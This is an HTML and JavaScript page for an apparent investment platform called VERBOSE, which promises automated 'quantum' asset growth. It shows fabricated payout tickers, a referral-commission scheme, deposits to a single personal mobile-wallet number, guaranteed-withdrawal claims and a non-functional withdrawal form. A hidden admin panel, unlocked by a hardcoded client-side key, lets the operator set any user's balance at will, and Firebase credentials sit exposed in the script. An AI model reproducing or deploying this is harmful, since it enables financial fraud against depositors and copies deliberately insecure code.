<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<title>VERBOSE — The Infinite Terminal</title>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
<style>
  :root { --neon: #00f7ff; --accent: #7000ff; --bg: #000; --card: rgba(255,255,255,0.04); --border: rgba(255,255,255,0.08); --success: #00ff88; }
  * { box-sizing: border-box; transition: all 0.4s cubic-bezier(0.19, 1, 0.22, 1); font-family: 'Plus Jakarta Sans', sans-serif; -webkit-tap-highlight-color: transparent; }
  body { margin:0; background: var(--bg); color: #fff; overflow-x: hidden; }

  /* Dynamic Background */
  .meta-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at 50% 0%, rgba(112,0,255,0.1), transparent 70%); z-index: -1; }
  
  /* Dual Tickers */
  .ticker-top { background: rgba(0,255,136,0.1); padding: 8px 0; font-size: 9px; font-weight: 800; color: var(--success); overflow: hidden; white-space: nowrap; border-bottom: 1px solid var(--border); }
  .ticker-bottom { position: fixed; bottom: 0; width: 100%; background: #050505; border-top: 1px solid var(--border); padding: 5px 0; font-size: 8px; color: var(--neon); z-index: 1001; }
  .ticker-move { display: inline-block; animation: scroll 25s linear infinite; }
  @keyframes scroll { from { transform: translateX(100%); } to { transform: translateX(-100%); } }

  header { text-align: center; padding: 40px 20px 10px; font-size: 26px; font-weight: 800; letter-spacing: 15px; color: #fff; text-shadow: 0 0 20px var(--neon); cursor: pointer; }
  .page { max-width: 480px; margin: 0 auto; padding: 20px 20px 150px; display: none; }
  .page.active { display: block; animation: slideUp 0.6s ease; }
  @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }

  /* Premium Components */
  .id-card { background: linear-gradient(135deg, #111, #000); border: 1px solid var(--border); border-radius: 35px; padding: 25px; margin-bottom: 25px; position: relative; overflow: hidden; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
  .glass-card { background: var(--card); border: 1px solid var(--border); padding: 25px; border-radius: 35px; backdrop-filter: blur(40px); margin-bottom: 25px; }
  
  input, select { width: 100%; padding: 18px; margin-top: 10px; border-radius: 20px; border: 1px solid var(--border); background: rgba(0,0,0,0.4); color: #fff; outline: none; }
  button { width: 100%; padding: 20px; margin-top: 15px; border-radius: 22px; border: none; font-weight: 800; text-transform: uppercase; cursor: pointer; letter-spacing: 2px; font-size: 11px; }
  .btn-alpha { background: linear-gradient(135deg, var(--neon), var(--accent)); color: #fff; box-shadow: 0 10px 30px rgba(0,247,255,0.3); }

  /* Nav System */
  .nav { position: fixed; bottom: 30px; left: 15px; right: 15px; background: rgba(10,10,10,0.95); display: flex; justify-content: space-around; padding: 22px; border-radius: 40px; border: 1px solid var(--border); backdrop-filter: blur(30px); z-index: 1000; }
  .nav-item { font-size: 9px; opacity: 0.4; font-weight: 800; color: #fff; text-transform: uppercase; }
  .nav-item.active { opacity: 1; color: var(--neon); text-shadow: 0 0 10px var(--neon); }

  /* Chat Floating */
  #chatToggle { position: fixed; bottom: 120px; right: 25px; width: 60px; height: 60px; background: var(--neon); border-radius: 50%; display: flex; align-items: center; justify-content: center; z-index: 2000; box-shadow: 0 10px 30px rgba(0,247,255,0.4); color: #000; font-size: 22px; cursor: pointer; }
  .hidden { display: none !important; }
</style>
</head>
<body>

<div class="meta-bg"></div>
<div class="ticker-top"><div class="ticker-move">✓ User_786 withdrew PKR 12,000 via JazzCash • ✓ New Investor joined: Alpha_Wolf • ✓ System Status: All Nodes Secure • ✓ Global Payouts Today: PKR 450,000+</div></div>

<header id="adminTrigger">VERBOSE</header>

<div id="dash" class="page active">
  <div class="id-card">
    <div style="font-size:8px; opacity:0.5; letter-spacing:3px;">QUANTUM INVESTOR CARD</div>
    <div style="font-size:24px; font-weight:800; margin:10px 0; color:var(--neon);" id="uNameCard">USER_PRIME</div>
    <div style="font-size:32px; font-weight:800; margin-bottom:15px;">PKR <span id="mainBal">0.00</span></div>
    <div style="display:flex; justify-content:space-between; font-size:9px; opacity:0.6;">
        <span>ID: #VB-2026-99</span>
        <span>MEMBER: PRO ELITE</span>
    </div>
  </div>

  <div class="glass-card" style="border-style:dashed;">
    <b style="font-size:10px; color:var(--success);">INVITE & EARN 10%</b>
    <input id="refLink" readonly value="https://verbose.com/join?ref=nazim" style="font-size:11px; color:var(--neon);">
    <button class="btn-alpha" style="padding:10px; margin-top:10px; font-size:9px;" onclick="copyRef()">Copy Referral Link</button>
  </div>

  <div id="userPlansDisplay"></div>
</div>

<div id="wallet" class="page">
    <div class="glass-card">
        <h3 style="letter-spacing:5px;">DEPOSIT CAPITAL</h3>
        <select id="depMethod">
            <option>EasyPaisa (03705519562)</option>
            <option>JazzCash (03705519562)</option>
        </select>
        <input type="number" placeholder="Enter Amount (PKR)">
        <input type="text" placeholder="Transaction ID (TrxID)">
        <button class="btn-alpha">Submit Deposit</button>
    </div>
    <div class="glass-card">
        <h3 style="letter-spacing:5px; color:#ff4646;">WITHDRAW ASSETS</h3>
        <input type="number" placeholder="Withdrawal Amount">
        <input type="text" placeholder="Account Number">
        <button class="btn-alpha" style="background:rgba(255,255,255,0.05); border:1px solid var(--border);">Request Withdrawal</button>
    </div>
</div>

<div id="info" class="page">
    <div class="glass-card">
        <h3 style="color:var(--neon);">ABOUT VERBOSE</h3>
        <p style="font-size:12px; opacity:0.7; line-height:1.6;">Based in Rawalpindi, Verbose is Pakistan's first high-frequency quantum asset manager. We automate your growth through smart cloud nodes.</p>
    </div>
    <div class="glass-card">
        <h3 style="color:var(--success);">TRUST & PRIVACY</h3>
        <p style="font-size:11px; opacity:0.6;">All transactions are encrypted. We guarantee 24/7 withdrawals. Your identity remains anonymous in our decentralized ledger.</p>
    </div>
    <button onclick="localStorage.clear(); location.reload();" style="color:#ff4646; background:rgba(255,70,70,0.1);">Termination Logout</button>
</div>

<div id="admin" class="page">
    <div class="glass-card" style="border-color:var(--accent);">
        <code style="color:var(--success); font-size:11px;">> TERMINAL_ACCESS: GRANTED<br>> ENCRYPTION: ACTIVE</code>
        <input id="targetUser" placeholder="Client Username" style="margin-top:20px;">
        <input id="editBal" type="number" placeholder="Force Balance Update">
        <button onclick="overrideUser()" class="btn-alpha">Execute Overwrite</button>
    </div>
</div>

<div class="nav">
  <div class="nav-item active" onclick="tab('dash', this)">Asset</div>
  <div class="nav-item" onclick="tab('wallet', this)">Wallet</div>
  <div class="nav-item" onclick="tab('info', this)">Trust</div>
  <div id="navAdmin" class="nav-item" onclick="tab('admin', this)">Root</div>
</div>

<div id="chatToggle" onclick="alert('Support: Salam! User, our team is reviewing your account history.')">💬</div>

<div class="ticker-bottom"><div class="ticker-move">BITCOIN: $68,120.40 (+1.2%) • GOLD: $2,160.10 (-0.05%) • ETH: $3,450.00 (+2.1%) • USDT/PKR: 282.50 • SOL: $152.10 (+4.8%)</div></div>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
  import { getDatabase, ref, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

  const firebaseConfig = {
    apiKey: "AIzaSyBe5Q5jXpx3UvrHC9WOky9UWeDnP9SPfZI",
    authDomain: "verbose-6c008.firebaseapp.com",
    projectId: "verbose-6c008",
    databaseURL: "https://verbose-6c008-default-rtdb.firebaseio.com",
    appId: "1:867100945312:web:315dfb48fb34496cee12c5"
  };
  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);

  const uName = localStorage.getItem('v_user') || "New_Investor";
  document.getElementById('uNameCard').innerText = uName.toUpperCase();
  document.getElementById('refLink').value = `https://verbose.com/join?ref=${uName.toLowerCase()}`;

  // Voice Greeting
  window.addEventListener('load', () => {
    const talk = new SpeechSynthesisUtterance(`Welcome to the terminal, ${uName}. All systems are normal.`);
    talk.pitch = 0.9; window.speechSynthesis.speak(talk);
  });

  window.copyRef = () => {
    const link = document.getElementById('refLink');
    link.select(); document.execCommand('copy');
    alert("Referral Link Copied! Send to friends for 10% commission.");
  };

  window.tab = (id, el) => {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    if(el) {
        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
        el.classList.add('active');
    }
  };

  // Admin Access
  let clicks = 0;
  document.getElementById('adminTrigger').onclick = () => {
    clicks++; if(clicks >= 7) { 
        const key = prompt("Enter Master Root Key:");
        if(key === "NAZIM786") tab('admin', document.getElementById('navAdmin'));
        clicks = 0; 
    }
  };

  window.overrideUser = async () => {
    const u = document.getElementById('targetUser').value.trim().toLowerCase();
    const b = document.getElementById('editBal').value;
    if(!u || !b) return;
    await update(ref(db, 'users/' + u), { balance: parseFloat(b) });
    alert("Asset Value Overwritten.");
  };
</script>
</body>
</html>
